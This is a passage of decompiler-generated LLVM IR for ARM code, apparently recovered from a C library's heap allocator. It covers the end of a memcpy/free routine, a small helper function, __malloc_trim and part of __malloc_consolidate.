  %v1_141a8 = add i32 %v0_141a8, -8
  store i32 %v1_141a8, i32* @r2, align 4
  %v0_141ac = load i32, i32* @r5, align 4
  store i32 %v0_141ac, i32* @r1, align 4
  %v0_141b0 = call i32 @memcpy()
  %v0_141b4 = load i32, i32* @r5, align 4
  store i32 %v0_141b4, i32* @r0, align 4
  %v0_141b8 = call i32 @free()
  store i32 %v0_141b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14198, %dec_label_pc_14190, %dec_label_pc_140e8, %.thread6, %dec_label_pc_13f58, %dec_label_pc_141a8
  store i32 %v2_13ea4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v4_141cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_141cc)
  br label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_13ed8, %dec_label_pc_13e80, %dec_label_pc_13e68, %dec_label_pc_141bc
  %v0_141d8 = load i32, i32* @r4, align 4
  store i32 %v0_141d8, i32* %r0.global-to-local, align 4
  store i32 %v3_13e48, i32* @r4, align 4
  store i32 %v6_13e48, i32* @r5, align 4
  store i32 %v9_13e48, i32* @r6, align 4
  store i32 %v12_13e48, i32* @r7, align 4
  store i32 %v15_13e48, i32* @r8, align 4
  store i32 %v18_13e48, i32* @sb, align 4
  store i32 %v21_13e48, i32* @sl, align 4
  store i32 %v24_13e48, i32* @fp, align 4
  store i32 %v27_13e48, i32* @lr, align 4
  ret i32 %v0_141d8

; uselistorder directives
  uselistorder i32 %v2_14170, { 1, 0, 2 }
  uselistorder i32 %v2_14158, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14134, { 1, 0, 2 }
  uselistorder i32 %v3_14114, { 1, 0, 2, 3 }
  uselistorder i32 %v1_140b8, { 2, 1, 0 }
  uselistorder i32 %v2_14088, { 1, 0, 2 }
  uselistorder i32 %v0_1401c, { 1, 0 }
  uselistorder i32 %v0_13fd8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13f3c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13f34, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13f18, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13f10, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_13f0c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_13efc, { 1, 0 }
  uselistorder i32 %v0_13ef8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13ed0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 20, 12, 14, 13, 21, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_141d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_141bc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_140e8, { 1, 0 }
  uselistorder label %dec_label_pc_14088, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13fd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13fc8, { 1, 0 }
  uselistorder label %dec_label_pc_13fc4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_141ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_141ec:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_141ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_141ec, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_141ec
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_14200.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14200.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_14204.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_141ec, %bb
  %v4_14204 = phi i32 [ %v4_14204.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_141ec ], [ 0, %bb ]
  ret i32 %v4_14204

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14208 = add i32 %arg2, 44
  %v2_14208 = inttoptr i32 %v1_14208 to i32*
  %v3_14208 = load i32, i32* %v2_14208, align 4
  %v12_1420c = load i32, i32* @r7, align 4
  %v1_14210 = add i32 %v3_14208, 4
  %v2_14210 = inttoptr i32 %v1_14210 to i32*
  %v3_14210 = load i32, i32* %v2_14210, align 4
  %v1_14214 = add i32 %arg2, 860
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  %v3_14214 = load i32, i32* %v2_14214, align 4
  store i32 %v3_14214, i32* @r4, align 4
  %v1_14218 = and i32 %v3_14210, -4
  store i32 %v1_14218, i32* @r6, align 4
  %v1_1421c = add i32 %v1_14218, -17
  %v2_14220 = add i32 %v1_1421c, %v3_14214
  store i32 %arg2, i32* @r5, align 4
  %v2_1422c = sub i32 %v2_14220, %arg1
  store i32 %v3_14214, i32* %r1.global-to-local, align 4
  %v2_14234 = udiv i32 %v2_1422c, %v3_14214
  %v1_14238 = add i32 %v2_14234, -1
  store i32 %v1_14238, i32* %r0.global-to-local, align 4
  %v2_1423c = mul i32 %v1_14238, %v3_14214
  store i32 %v2_1423c, i32* @r7, align 4
  %v2_14240 = icmp eq i32 %v2_1423c, 0
  store i1 %v2_14240, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1423c, 1
  br i1 %tmp8, label %dec_label_pc_142a8, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1424c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1424c, i32* %r0.global-to-local, align 4
  %v0_14250 = load i32, i32* @r5, align 4
  %v1_14250 = add i32 %v0_14250, 44
  %v2_14250 = inttoptr i32 %v1_14250 to i32*
  %v3_14250 = load i32, i32* %v2_14250, align 4
  %v0_14254 = load i32, i32* @r6, align 4
  %v2_14254 = add i32 %v0_14254, %v3_14250
  %v9_14258 = icmp eq i32 %v1_1424c, %v2_14254
  store i1 %v9_14258, i1* @cpsr_z, align 1
  store i32 %v1_1424c, i32* @r4, align 4
  br i1 %v9_14258, label %dec_label_pc_14264, label %dec_label_pc_142a8

dec_label_pc_14264:                               ; preds = %dec_label_pc_14248
  %v0_14264 = load i32, i32* @r7, align 4
  %v1_14264 = sub i32 0, %v0_14264
  store i32 %v1_14264, i32* %r0.global-to-local, align 4
  %v1_14268 = call i32 @__GI_sbrk(i32 %v1_14264)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14270 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14270, i32* %r0.global-to-local, align 4
  %v7_14274 = icmp eq i32 %v1_14270, -1
  store i1 %v7_14274, i1* @cpsr_z, align 1
  br i1 %v7_14274, label %dec_label_pc_142a8, label %dec_label_pc_1427c

dec_label_pc_1427c:                               ; preds = %dec_label_pc_14264
  %v0_1427c = load i32, i32* @r4, align 4
  %v2_1427c = sub i32 %v0_1427c, %v1_14270
  store i32 %v2_1427c, i32* %r0.global-to-local, align 4
  %v9_1427c = icmp eq i32 %v0_1427c, %v1_14270
  store i1 %v9_1427c, i1* @cpsr_z, align 1
  br i1 %v9_1427c, label %dec_label_pc_142a8, label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %dec_label_pc_1427c
  %v0_14284 = load i32, i32* @r5, align 4
  %v1_14284 = add i32 %v0_14284, 872
  %v2_14284 = inttoptr i32 %v1_14284 to i32*
  %v3_14284 = load i32, i32* %v2_14284, align 4
  %v1_14288 = load i32, i32* @r6, align 4
  %v2_14288 = sub i32 %v1_14288, %v2_1427c
  store i32 %v2_14288, i32* %r2.global-to-local, align 4
  %v1_1428c = add i32 %v0_14284, 44
  %v2_1428c = inttoptr i32 %v1_1428c to i32*
  %v3_1428c = load i32, i32* %v2_1428c, align 4
  store i32 %v3_1428c, i32* %r1.global-to-local, align 4
  %v2_14290 = sub i32 %v3_14284, %v2_1427c
  %v1_14294 = or i32 %v2_14288, 1
  store i32 %v1_14294, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14290, i32* %v2_14284, align 4
  %v0_142a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_142a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_142a0 = add i32 %v1_142a0, 4
  %v3_142a0 = inttoptr i32 %v2_142a0 to i32*
  store i32 %v0_142a0, i32* %v3_142a0, align 4
  %v1_142b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142ac

dec_label_pc_142a8:                               ; preds = %dec_label_pc_14248, %dec_label_pc_1427c, %dec_label_pc_14264, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142ac

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14284, %dec_label_pc_142a8
  %v1_142b4 = phi i32 [ %v1_142b4.pre, %dec_label_pc_14284 ], [ 0, %dec_label_pc_142a8 ]
  store i32 %v12_1420c, i32* @r7, align 4
  ret i32 %v1_142b4

; uselistorder directives
  uselistorder i1 %v7_14274, { 1, 0 }
  uselistorder i32 %v1_14270, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14214, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_142ac, { 1, 0 }
  uselistorder label %dec_label_pc_142a8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_142b8 = load i32, i32* @r4, align 4
  store i32 %v3_142b8, i32* %stack_var_-36, align 4
  %v0_142bc = load i32, i32* @r0, align 4
  %v1_142bc = inttoptr i32 %v0_142bc to i32*
  %v2_142bc = load i32, i32* %v1_142bc, align 4
  store i32 %v2_142bc, i32* %r3.global-to-local, align 4
  %v2_142c0 = icmp eq i32 %v2_142bc, 0
  store i32 %v0_142bc, i32* @r4, align 4
  br i1 %v2_142c0, label %dec_label_pc_143f8.preheader, label %dec_label_pc_142d4

dec_label_pc_143f8.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1440025 = add i32 %v0_142bc, 52
  store i32 %v1_1440025, i32* %r3.global-to-local, align 4
  %v2_1440826 = add i32 %v0_142bc, 60
  %v3_1440827 = inttoptr i32 %v2_1440826 to i32*
  store i32 %v1_1440025, i32* %v3_1440827, align 4
  %v0_1440c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1440c29 = add i32 %v0_1440c28, 12
  %v3_1440c30 = inttoptr i32 %v2_1440c29 to i32*
  store i32 %v0_1440c28, i32* %v3_1440c30, align 4
  br label %dec_label_pc_143f8.dec_label_pc_143f8_crit_edge

dec_label_pc_142d4:                               ; preds = %entry
  %v1_142d4 = and i32 %v2_142bc, -3
  %v3_142d8 = udiv i32 %v2_142bc, 8
  store i32 %v3_142d8, i32* %r2.global-to-local, align 4
  store i32 %v1_142d4, i32* %v1_142bc, align 4
  %v0_142e0 = load i32, i32* @r0, align 4
  %v1_142e0 = add i32 %v0_142e0, -4
  store i32 %v1_142e0, i32* %r3.global-to-local, align 4
  %v1_142e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_142e4 = mul i32 %v1_142e4, 4
  %v5_142e4 = add i32 %v4_142e4, %v1_142e0
  store i32 %v5_142e4, i32* %sb.global-to-local, align 4
  %v1_142e8 = add i32 %v0_142e0, 52
  store i32 %v1_142e8, i32* %r7.global-to-local, align 4
  %v1_142ec = add i32 %v0_142e0, 4
  store i32 %v1_142ec, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_142f4

dec_label_pc_142f4:                               ; preds = %dec_label_pc_143f0, %dec_label_pc_142d4
  %v1_143e810 = phi i32 [ %v1_143e8, %dec_label_pc_143f0 ], [ %v5_142e4, %dec_label_pc_142d4 ]
  %v1_14300 = phi i32 [ %v1_143f0, %dec_label_pc_143f0 ], [ %v1_142ec, %dec_label_pc_142d4 ]
  %v1_142f4 = inttoptr i32 %v1_14300 to i32*
  %v2_142f4 = load i32, i32* %v1_142f4, align 4
  store i32 %v2_142f4, i32* %r1.global-to-local, align 4
  %v2_142f8 = icmp eq i32 %v2_142f4, 0
  br i1 %v2_142f8, label %dec_label_pc_143e8, label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %dec_label_pc_142f4
  %v0_14300 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14300, i32* %v1_142f4, align 4
  %v0_14304.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %dec_label_pc_143dc, %dec_label_pc_14300
  %v0_14320 = phi i32 [ %v0_143dc, %dec_label_pc_143dc ], [ %v0_14304.pre, %dec_label_pc_14300 ]
  %v1_14304 = add i32 %v0_14320, 4
  %v2_14304 = inttoptr i32 %v1_14304 to i32*
  %v3_14304 = load i32, i32* %v2_14304, align 4
  store i32 %v3_14304, i32* %r3.global-to-local, align 4
  %v1_14308 = and i32 %v3_14304, -2
  store i32 %v1_14308, i32* %lr.global-to-local, align 4
  %v2_1430c = add i32 %v1_14308, %v0_14320
  store i32 %v2_1430c, i32* @r0, align 4
  %v1_14310 = urem i32 %v3_14304, 2
  %v2_14310 = icmp eq i32 %v1_14310, 0
  %v1_14314 = add i32 %v0_14320, 8
  %v2_14314 = inttoptr i32 %v1_14314 to i32*
  %v3_14314 = load i32, i32* %v2_14314, align 4
  store i32 %v3_14314, i32* %sl.global-to-local, align 4
  %v1_14318 = add i32 %v2_1430c, 4
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  %v3_14318 = load i32, i32* %v2_14318, align 4
  store i32 %v3_14318, i32* %r8.global-to-local, align 4
  br i1 %v2_14310, label %dec_label_pc_14320, label %dec_label_pc_14354

dec_label_pc_14320:                               ; preds = %dec_label_pc_14304
  %v1_14320 = inttoptr i32 %v0_14320 to i32*
  %v2_14320 = load i32, i32* %v1_14320, align 4
  store i32 %v2_14320, i32* %r5.global-to-local, align 4
  %v2_14324 = sub i32 %v0_14320, %v2_14320
  store i32 %v2_14324, i32* %r3.global-to-local, align 4
  %v1_14328 = add i32 %v2_14324, 8
  %v2_14328 = inttoptr i32 %v1_14328 to i32*
  %v3_14328 = load i32, i32* %v2_14328, align 4
  store i32 %v3_14328, i32* %ip.global-to-local, align 4
  %v1_1432c = add i32 %v3_14328, 12
  %v2_1432c = inttoptr i32 %v1_1432c to i32*
  %v3_1432c = load i32, i32* %v2_1432c, align 4
  store i32 %v3_1432c, i32* %r1.global-to-local, align 4
  %v9_14330 = icmp eq i32 %v3_1432c, %v2_14324
  %v1_14334 = add i32 %v2_14324, 12
  %v2_14334 = inttoptr i32 %v1_14334 to i32*
  %v3_14334 = load i32, i32* %v2_14334, align 4
  store i32 %v3_14334, i32* %r2.global-to-local, align 4
  br i1 %v9_14330, label %dec_label_pc_1433c, label %dec_label_pc_14398

dec_label_pc_1433c:                               ; preds = %dec_label_pc_14320
  %v1_1433c = add i32 %v3_14334, 8
  %v2_1433c = inttoptr i32 %v1_1433c to i32*
  %v3_1433c = load i32, i32* %v2_1433c, align 4
  store i32 %v3_1433c, i32* %r3.global-to-local, align 4
  %v9_14340 = icmp eq i32 %v3_1433c, %v2_14324
  br i1 %v9_14340, label %dec_label_pc_14348, label %dec_label_pc_14398

dec_label_pc_14348:                               ; preds = %dec_label_pc_1433c
  store i32 %v3_14328, i32* %v2_1433c, align 4
  %v0_1434c = load i32, i32* %r2.global-to-local, align 4
  %v1_1434c = load i32, i32* %ip.global-to-local, align 4
  %v2_1434c = add i32 %v1_1434c, 12
  %v3_1434c = inttoptr i32 %v2_1434c to i32*
  store i32 %v0_1434c, i32* %v3_1434c, align 4
  %v0_14350 = load i32, i32* %lr.global-to-local, align 4
  %v1_14350 = load i32, i32* %r5.global-to-local, align 4
  %v2_14350 = add i32 %v1_14350, %v0_14350
  store i32 %v2_14350, i32* %lr.global-to-local, align 4
  %v0_14358.pre = load i32, i32* @r0, align 4
  %v0_1435c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_14304, %dec_label_pc_14348
  %v0_143cc = phi i32 [ %v1_14308, %dec_label_pc_14304 ], [ %v2_14350, %dec_label_pc_14348 ]
  %v0_1435c = phi i32 [ %v3_14318, %dec_label_pc_14304 ], [ %v0_1435c.pre, %dec_label_pc_14348 ]
  %v1_14370 = phi i32 [ %v2_1430c, %dec_label_pc_14304 ], [ %v0_14358.pre, %dec_label_pc_14348 ]
  %v0_14354 = load i32, i32* @r4, align 4
  %v1_14354 = add i32 %v0_14354, 44
  %v2_14354 = inttoptr i32 %v1_14354 to i32*
  %v3_14354 = load i32, i32* %v2_14354, align 4
  store i32 %v3_14354, i32* %r3.global-to-local, align 4
  %v9_14358 = icmp eq i32 %v1_14370, %v3_14354
  %v1_1435c = and i32 %v0_1435c, -4
  store i32 %v1_1435c, i32* %r5.global-to-local, align 4
  br i1 %v9_14358, label %dec_label_pc_143cc, label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %dec_label_pc_14354
  %v2_14364 = add i32 %v1_14370, %v1_1435c
  store i32 %v2_14364, i32* %r3.global-to-local, align 4
  %v1_14368 = add i32 %v2_14364, 4
  %v2_14368 = inttoptr i32 %v1_14368 to i32*
  %v3_14368 = load i32, i32* %v2_14368, align 4
  store i32 %v3_14368, i32* %r3.global-to-local, align 4
  %v1_1436c = urem i32 %v3_14368, 2
  %v2_1436c = icmp eq i32 %v1_1436c, 0
  %v2_14370 = add i32 %v1_14370, 4
  %v3_14370 = inttoptr i32 %v2_14370 to i32*
  store i32 %v1_1435c, i32* %v3_14370, align 4
  br i1 %v2_1436c, label %dec_label_pc_14378, label %dec_label_pc_14364.dec_label_pc_143a8_crit_edge

dec_label_pc_14364.dec_label_pc_143a8_crit_edge:  ; preds = %dec_label_pc_14364
  %v0_143ac.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_14378:                               ; preds = %dec_label_pc_14364
  %v0_14378 = load i32, i32* @r0, align 4
  %v1_14378 = add i32 %v0_14378, 8
  %v2_14378 = inttoptr i32 %v1_14378 to i32*
  %v3_14378 = load i32, i32* %v2_14378, align 4
  store i32 %v3_14378, i32* %ip.global-to-local, align 4
  %v1_1437c = add i32 %v3_14378, 12
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* %r3.global-to-local, align 4
  %v9_14380 = icmp eq i32 %v3_1437c, %v0_14378
  %v1_14384 = add i32 %v0_14378, 12
  %v2_14384 = inttoptr i32 %v1_14384 to i32*
  %v3_14384 = load i32, i32* %v2_14384, align 4
  store i32 %v3_14384, i32* %r2.global-to-local, align 4
  br i1 %v9_14380, label %dec_label_pc_1438c, label %dec_label_pc_14398

dec_label_pc_1438c:                               ; preds = %dec_label_pc_14378
  %v1_1438c = add i32 %v3_14384, 8
  %v2_1438c = inttoptr i32 %v1_1438c to i32*
  %v3_1438c = load i32, i32* %v2_1438c, align 4
  store i32 %v3_1438c, i32* %r3.global-to-local, align 4
  %v9_14390 = icmp eq i32 %v3_1438c, %v0_14378
  br i1 %v9_14390, label %dec_label_pc_1439c, label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %dec_label_pc_14378, %dec_label_pc_1433c, %dec_label_pc_14320, %dec_label_pc_1438c
  %v0_14398 = call i32 @abort()
  store i32 %v0_14398, i32* @r0, align 4
  %v0_1439c.pre = load i32, i32* @ip, align 4
  %v1_1439c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %dec_label_pc_1438c, %dec_label_pc_14398
  %v1_1439c = phi i32 [ %v3_14384, %dec_label_pc_1438c ], [ %v1_1439c.pre, %dec_label_pc_14398 ]
  %v0_1439c = phi i32 [ %v3_14378, %dec_label_pc_1438c ], [ %v0_1439c.pre, %dec_label_pc_14398 ]
  %v2_1439c = add i32 %v1_1439c, 8
  %v3_1439c = inttoptr i32 %v2_1439c to i32*
  store i32 %v0_1439c, i32* %v3_1439c, align 4
  %v0_143a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_143a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_143a0 = add i32 %v1_143a0, 12
  %v3_143a0 = inttoptr i32 %v2_143a0 to i32*
  store i32 %v0_143a0, i32* %v3_143a0, align 4
  %v0_143a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_143a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_143a4 = add i32 %v1_143a4, %v0_143a4
  store i32 %v2_143a4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14364.dec_label_pc_143a8_crit_edge, %dec_label_pc_1439c
  %v0_143ac = phi i32 [ %v0_143ac.pre, %dec_label_pc_14364.dec_label_pc_143a8_crit_edge ], [ %v2_143a4, %dec_label_pc_1439c ]
  %v0_143a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_143a8 = add i32 %v0_143a8, 8
  %v2_143a8 = inttoptr i32 %v1_143a8 to i32*
  %v3_143a8 = load i32, i32* %v2_143a8, align 4
  store i32 %v3_143a8, i32* %r2.global-to-local, align 4
  %v1_143ac = or i32 %v0_143ac, 1
  store i32 %v1_143ac, i32* %r3.global-to-local, align 4
  %v0_143b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_143b0, i32* %v2_143a8, align 4
  %v0_143b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_143b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_143b4 = add i32 %v1_143b4, 12
  %v3_143b4 = inttoptr i32 %v2_143b4 to i32*
  store i32 %v0_143b4, i32* %v3_143b4, align 4
  %v0_143b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_143b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_143b8 = add i32 %v1_143b8, %v0_143b8
  %v4_143b8 = inttoptr i32 %v3_143b8 to i32*
  store i32 %v0_143b8, i32* %v4_143b8, align 4
  %v0_143bc = load i32, i32* %r3.global-to-local, align 4
  %v1_143bc = load i32, i32* %r1.global-to-local, align 4
  %v2_143bc = add i32 %v1_143bc, 4
  %v3_143bc = inttoptr i32 %v2_143bc to i32*
  store i32 %v0_143bc, i32* %v3_143bc, align 4
  %v0_143c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_143c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_143c0 = add i32 %v1_143c0, 8
  %v3_143c0 = inttoptr i32 %v2_143c0 to i32*
  store i32 %v0_143c0, i32* %v3_143c0, align 4
  %v0_143c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143c4 = add i32 %v1_143c4, 12
  %v3_143c4 = inttoptr i32 %v2_143c4 to i32*
  store i32 %v0_143c4, i32* %v3_143c4, align 4
  br label %dec_label_pc_143dc

dec_label_pc_143cc:                               ; preds = %dec_label_pc_14354
  %v2_143cc = add i32 %v1_1435c, %v0_143cc
  %v1_143d0 = or i32 %v2_143cc, 1
  store i32 %v1_143d0, i32* %r3.global-to-local, align 4
  %v1_143d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143d4 = add i32 %v1_143d4, 4
  %v3_143d4 = inttoptr i32 %v2_143d4 to i32*
  store i32 %v1_143d0, i32* %v3_143d4, align 4
  %v0_143d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_143d8 = load i32, i32* @r4, align 4
  %v2_143d8 = add i32 %v1_143d8, 44
  %v3_143d8 = inttoptr i32 %v2_143d8 to i32*
  store i32 %v0_143d8, i32* %v3_143d8, align 4
  br label %dec_label_pc_143dc

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143a8, %dec_label_pc_143cc
  %v0_143dc = load i32, i32* %sl.global-to-local, align 4
  %v2_143dc = icmp eq i32 %v0_143dc, 0
  store i32 %v0_143dc, i32* %r1.global-to-local, align 4
  br i1 %v2_143dc, label %dec_label_pc_143e8.loopexit, label %dec_label_pc_14304

dec_label_pc_143e8.loopexit:                      ; preds = %dec_label_pc_143dc
  %v0_143e8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_143e8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143e8.loopexit, %dec_label_pc_142f4
  %v1_143e8 = phi i32 [ %v1_143e8.pre, %dec_label_pc_143e8.loopexit ], [ %v1_143e810, %dec_label_pc_142f4 ]
  %v0_143f0 = phi i32 [ %v0_143e8.pre, %dec_label_pc_143e8.loopexit ], [ %v1_14300, %dec_label_pc_142f4 ]
  %v9_143e8 = icmp eq i32 %v0_143f0, %v1_143e8
  br i1 %v9_143e8, label %dec_label_pc_14460, label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143e8
  %v1_143f0 = add i32 %v0_143f0, 4
  store i32 %v1_143f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_142f4

dec_label_pc_143f8.dec_label_pc_143f8_crit_edge:  ; preds = %dec_label_pc_143f8.preheader, %dec_label_pc_143f8.dec_label_pc_143f8_crit_edge
  %v0_143f8.pre = load i32, i32* @r4, align 4
  %v1_143f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_143f8 = mul i32 %v1_143f8.pre, 8
  %v5_143f8 = add i32 %v4_143f8, %v0_143f8.pre
  %v1_143fc = add i32 %v1_143f8.pre, 1
  store i32 %v1_143fc, i32* %r2.global-to-local, align 4
  %v1_14400 = add i32 %v5_143f8, 44
  store i32 %v1_14400, i32* %r3.global-to-local, align 4
  %v2_14408 = add i32 %v5_143f8, 52
  %v3_14408 = inttoptr i32 %v2_14408 to i32*
  store i32 %v1_14400, i32* %v3_14408, align 4
  %v0_1440c = load i32, i32* %r3.global-to-local, align 4
  %v2_1440c = add i32 %v0_1440c, 12
  %v3_1440c = inttoptr i32 %v2_1440c to i32*
  store i32 %v0_1440c, i32* %v3_1440c, align 4
  %v7_14410 = icmp sgt i32 %v1_143fc, 95
  br i1 %v7_14410, label %dec_label_pc_14414, label %dec_label_pc_143f8.dec_label_pc_143f8_crit_edge

dec_label_pc_14414:                               ; preds = %dec_label_pc_143f8.dec_label_pc_143f8_crit_edge
  %v0_14414 = load i32, i32* @r4, align 4
  %v1_14414 = inttoptr i32 %v0_14414 to i32*
  %v2_14414 = load i32, i32* %v1_14414, align 4
  store i32 %v2_14414, i32* %r2.global-to-local, align 4
  %v1_14418 = add i32 %v0_14414, 864
  %v2_14418 = inttoptr i32 %v1_14418 to i32*
  %v3_14418 = load i32, i32* %v2_14418, align 4
  %v1_14420 = urem i32 %v2_14414, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_14428 = or i32 %v3_14418, 1
  store i32 %v1_14428, i32* %r1.global-to-local, align 4
  %v1_1442c = or i32 %v1_14420, 72
